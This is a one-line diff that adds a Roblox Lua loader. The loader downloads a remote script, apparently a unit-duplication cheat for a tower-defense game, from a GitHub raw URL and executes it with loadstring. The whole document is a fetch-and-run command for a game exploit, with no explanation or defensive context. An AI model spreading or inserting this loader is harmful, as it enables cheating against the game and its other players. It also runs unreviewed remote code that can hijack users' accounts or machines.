@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bambik232324/dupe-units-ttd/main/ttd.lua"))()
